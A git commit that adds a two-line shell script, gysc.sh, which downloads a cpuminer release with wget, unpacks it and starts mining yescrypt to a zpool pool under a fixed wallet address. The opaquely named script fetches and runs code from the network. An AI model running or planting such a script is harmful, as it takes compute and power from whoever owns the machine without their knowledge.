e785400d67ff07ee27aaba7a2906ddb591a67cfa
harkandon <92619165+harkandon@users.noreply.github.com>
2021-10-16 12:16:09 +0700

    Create gysc.sh

---
+++ gysc.sh
@@ -0,0 +1,2 @@
+#!/bin/sh 
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yescrypt -o stratum+tcp://yescrypt.na.mine.zpool.ca:6233 -u DK6MFYcQV2gVEku8PHfHiqtAWDPfbHnjf8.DEGE -t 8
